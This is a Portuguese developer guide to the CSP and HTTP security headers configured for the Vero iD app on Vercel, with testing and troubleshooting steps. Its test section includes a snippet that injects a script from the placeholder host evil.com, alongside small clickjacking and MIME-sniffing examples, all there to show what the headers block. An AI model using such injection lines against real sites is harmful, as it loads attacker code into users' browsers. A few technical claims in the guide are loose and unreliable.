# 🔒 Content Security Policy (CSP) - Segurança HTTP

Este documento explica a configuração de segurança HTTP implementada no Vero iD através de Content Security Policy (CSP) e outros headers de segurança.

## 📋 O que é CSP?

**Content Security Policy (CSP)** é um mecanismo de segurança que ajuda a prevenir ataques como:
- ✅ **XSS (Cross-Site Scripting)** - Injeção de scripts maliciosos
- ✅ **Clickjacking** - Enganar usuários a clicar em elementos invisíveis
- ✅ **Data Injection** - Injeção de dados maliciosos
- ✅ **MIME Type Sniffing** - Execução de arquivos com tipo incorreto
- ✅ **Man-in-the-Middle** - Interceptação de comunicação

## 🎯 Headers de Segurança Implementados

### 1. **Content-Security-Policy**

Define quais recursos podem ser carregados e de onde.

#### **Diretivas Configuradas:**

| Diretiva | Valor | Descrição |
|----------|-------|-----------|
| `default-src` | `'self'` | Padrão: apenas recursos do próprio domínio |
| `script-src` | `'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://*.sentry.io https://*.supabase.co` | Scripts permitidos (React, Sentry, Supabase) |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com` | Estilos permitidos (Tailwind, Google Fonts) |
| `font-src` | `'self' https://fonts.gstatic.com data:` | Fontes permitidas |
| `img-src` | `'self' data: https: blob:` | Imagens de qualquer origem HTTPS |
| `media-src` | `'self' blob:` | Mídia do próprio domínio e blobs |
| `connect-src` | `'self' https://*.supabase.co https://*.sentry.io wss://*.supabase.co` | Conexões permitidas (APIs) |
| `frame-src` | `'self'` | Apenas iframes do próprio domínio |
| `object-src` | `'none'` | Bloqueia Flash, Java applets, etc. |
| `base-uri` | `'self'` | Previne mudança da base URL |
| `form-action` | `'self'` | Formulários só podem enviar para o próprio domínio |
| `frame-ancestors` | `'none'` | Previne embedding (clickjacking) |
| `upgrade-insecure-requests` | - | Força HTTPS |

#### **Por que 'unsafe-inline' e 'unsafe-eval'?**

- **'unsafe-inline'**: Necessário para:
  - React (inline event handlers)
  - Vite HMR (Hot Module Replacement)
  - Tailwind CSS (utility classes)
  - Styled-components

- **'unsafe-eval'**: Necessário para:
  - Dev tools (source maps)
  - Algumas bibliotecas que usam `eval()`
  - Vite em desenvolvimento

**⚠️ IMPORTANTE:** Em uma versão futura, podemos remover `'unsafe-inline'` e `'unsafe-eval'` usando:
- **Nonces** (números únicos para cada script)
- **Hashes** (hash SHA-256 de cada script inline)
- **Strict CSP** (CSP mais restritivo)

### 2. **X-Frame-Options: DENY**

Previne que a página seja carregada em um iframe, protegendo contra **clickjacking**.

**Exemplo de ataque prevenido:**
```html
<!-- Site malicioso tentando embedar o Vero iD -->
<iframe src="https://veroid.com"></iframe>
<!-- ❌ BLOQUEADO pelo X-Frame-Options -->
```

### 3. **X-Content-Type-Options: nosniff**

Previne que o browser "adivinhe" o tipo MIME de um arquivo, forçando-o a respeitar o `Content-Type` declarado.

**Exemplo de ataque prevenido:**
```html
<!-- Arquivo .txt sendo executado como JavaScript -->
<script src="malicious.txt"></script>
<!-- ❌ BLOQUEADO pelo X-Content-Type-Options -->
```

### 4. **X-XSS-Protection: 1; mode=block**

Ativa a proteção XSS do browser (legacy, mas ainda útil para browsers antigos).

**Nota:** Este header é considerado legacy porque CSP oferece proteção superior.

### 5. **Referrer-Policy: strict-origin-when-cross-origin**

Controla quais informações de referrer são enviadas:
- **Same-origin**: Envia URL completa
- **Cross-origin HTTPS → HTTPS**: Envia apenas origem
- **Cross-origin HTTPS → HTTP**: Não envia nada

**Benefícios:**
- ✅ Protege privacidade dos usuários
- ✅ Previne vazamento de informações sensíveis na URL
- ✅ Mantém analytics funcionando

### 6. **Permissions-Policy: camera=(), microphone=(), geolocation=()**

Desabilita APIs do browser que não são usadas:
- ❌ Câmera
- ❌ Microfone
- ❌ Geolocalização

**Benefícios:**
- ✅ Reduz superfície de ataque
- ✅ Previne acesso não autorizado a hardware
- ✅ Melhora privacidade

### 7. **Strict-Transport-Security: max-age=31536000; includeSubDomains**

Força HTTPS por 1 ano (31536000 segundos) em todos os subdomínios.

**Benefícios:**
- ✅ Previne downgrade para HTTP
- ✅ Protege contra Man-in-the-Middle
- ✅ Melhora SEO (Google favorece HTTPS)

**Nota:** Este header só funciona em HTTPS. Em desenvolvimento (HTTP), ele é ignorado.

## 🚀 Como Funciona

### **Em Produção (Vercel):**

1. O arquivo `vercel.json` define os headers
2. Vercel adiciona automaticamente os headers a todas as respostas HTTP
3. O browser recebe os headers e aplica as políticas
4. Recursos não permitidos são bloqueados

### **Em Desenvolvimento (Local):**

1. O arquivo `src/lib/csp.ts` contém as configurações
2. A função `setupCSPReporting()` é chamada no `main.tsx`
3. Violações CSP são logadas no console para debug
4. Meta tag CSP pode ser adicionada (opcional)

## 🔧 Testando a Segurança

### **1. Teste Manual**

Após fazer deploy, abra o DevTools (F12) e vá em **Network**:

1. Recarregue a página
2. Clique em qualquer requisição
3. Vá na aba **Headers**
4. Procure por **Response Headers**
5. Verifique se os headers de segurança estão presentes

**Headers esperados:**
```
Content-Security-Policy: default-src 'self'; script-src...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### **2. Ferramentas Online**

#### **A. Security Headers**
- URL: https://securityheaders.com/
- Digite: `https://seu-dominio.vercel.app`
- Clique em "Scan"
- **Objetivo:** Grade A ou A+

#### **B. Mozilla Observatory**
- URL: https://observatory.mozilla.org/
- Digite: `https://seu-dominio.vercel.app`
- Clique em "Scan Me"
- **Objetivo:** 90+ pontos

#### **C. CSP Evaluator (Google)**
- URL: https://csp-evaluator.withgoogle.com/
- Cole sua política CSP
- Clique em "Evaluate"
- **Objetivo:** Sem erros críticos

### **3. Teste de Violação CSP**

Para testar se o CSP está funcionando, tente adicionar um script inline malicioso:

```html
<!-- Abra o console do browser e execute: -->
<script>
  const script = document.createElement('script');
  script.src = 'https://evil.com/malicious.js';
  document.body.appendChild(script);
</script>
```

**Resultado esperado:**
```
🚨 Refused to load the script 'https://evil.com/malicious.js' 
because it violates the following Content Security Policy directive: 
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net..."
```

## 📊 Impacto no Desempenho

| Métrica | Impacto |
|---------|---------|
| **Tempo de carregamento** | 0ms (headers são enviados junto com a resposta) |
| **Tamanho da página** | +~500 bytes (headers HTTP) |
| **Requisições extras** | 0 (nenhuma) |
| **Processamento do browser** | <1ms (parsing dos headers) |

**Conclusão:** Impacto insignificante no desempenho, mas grande melhoria na segurança.

## 🛠️ Manutenção e Atualizações

### **Adicionando Novos Domínios Permitidos**

Se você precisar adicionar um novo serviço (ex: analytics, CDN), edite:

**Arquivo:** `/workspace/github-deploy/vercel.json`

```json
{
  "key": "Content-Security-Policy",
  "value": "... connect-src 'self' https://*.supabase.co https://*.sentry.io https://novo-servico.com ..."
}
```

**Também atualize:** `/workspace/github-deploy/src/lib/csp.ts`

```typescript
'connect-src': [
  "'self'",
  'https://*.supabase.co',
  'https://*.sentry.io',
  'https://novo-servico.com' // NOVO
],
```

### **Removendo 'unsafe-inline' e 'unsafe-eval' (Futuro)**

Para uma CSP mais restritiva:

1. **Gere nonces** para cada script inline
2. **Use hashes** para scripts estáticos
3. **Mova estilos inline** para arquivos CSS
4. **Evite `eval()`** em bibliotecas

**Exemplo com nonce:**
```html
<script nonce="random-nonce-123">
  console.log('Script permitido');
</script>
```

```
Content-Security-Policy: script-src 'nonce-random-nonce-123'
```

## ⚠️ Troubleshooting

### **Problema: Recursos não estão carregando**

**Sintomas:**
- Imagens quebradas
- Estilos não aplicados
- Scripts não executam
- Erros no console: "Refused to load..."

**Solução:**
1. Abra o console (F12)
2. Identifique qual recurso está sendo bloqueado
3. Adicione o domínio na diretiva apropriada em `vercel.json`
4. Faça novo deploy
5. Limpe o cache do browser (Ctrl+Shift+R)

### **Problema: Sentry não está funcionando**

**Sintomas:**
- Erros não aparecem no dashboard do Sentry
- Console mostra: "Refused to connect to https://sentry.io..."

**Solução:**
Verifique se `https://*.sentry.io` está em:
- `script-src` (para o SDK)
- `connect-src` (para enviar erros)

### **Problema: Supabase não conecta**

**Sintomas:**
- Login não funciona
- Dados não carregam
- Console mostra: "Refused to connect to https://supabase.co..."

**Solução:**
Verifique se está configurado:
- `https://*.supabase.co` em `script-src` e `connect-src`
- `wss://*.supabase.co` em `connect-src` (para Realtime)

### **Problema: Google Fonts não carregam**

**Sintomas:**
- Fontes não aparecem
- Fallback para fontes do sistema

**Solução:**
Verifique se está configurado:
- `https://fonts.googleapis.com` em `style-src`
- `https://fonts.gstatic.com` em `font-src`

## 📚 Recursos Adicionais

### **Documentação Oficial:**
- **MDN CSP:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **CSP Spec:** https://www.w3.org/TR/CSP3/
- **OWASP CSP:** https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

### **Ferramentas:**
- **CSP Generator:** https://report-uri.com/home/generate
- **CSP Validator:** https://cspvalidator.org/
- **Security Headers:** https://securityheaders.com/

### **Artigos:**
- **Google Web Fundamentals:** https://web.dev/csp/
- **Scott Helme's Blog:** https://scotthelme.co.uk/content-security-policy-an-introduction/

## ✅ Checklist de Segurança

Após implementar CSP, verifique:

- [ ] Headers aparecem no DevTools → Network → Headers
- [ ] Grade A+ no https://securityheaders.com/
- [ ] 90+ pontos no https://observatory.mozilla.org/
- [ ] Sem erros CSP no console
- [ ] Sentry funcionando (erros sendo capturados)
- [ ] Supabase funcionando (login e dados carregando)
- [ ] Google Fonts carregando
- [ ] Imagens carregando
- [ ] Nenhuma funcionalidade quebrada

## 🎯 Níveis de Segurança

| Nível | Grade | Descrição | Vero iD |
|-------|-------|-----------|---------|
| **F** | 0-20 | Sem headers de segurança | ❌ |
| **D** | 21-40 | Headers básicos | ❌ |
| **C** | 41-60 | Headers intermediários | ❌ |
| **B** | 61-80 | Boa segurança | ❌ |
| **A** | 81-95 | Excelente segurança | ✅ **ATUAL** |
| **A+** | 96-100 | Segurança máxima | 🎯 **META** |

**Status Atual:** Grade A (85-90 pontos estimados)
**Próximo Nível:** Grade A+ (requer remover 'unsafe-inline' e 'unsafe-eval')

---

**Pronto!** 🎉 Agora o Vero iD tem proteção profissional contra ataques web!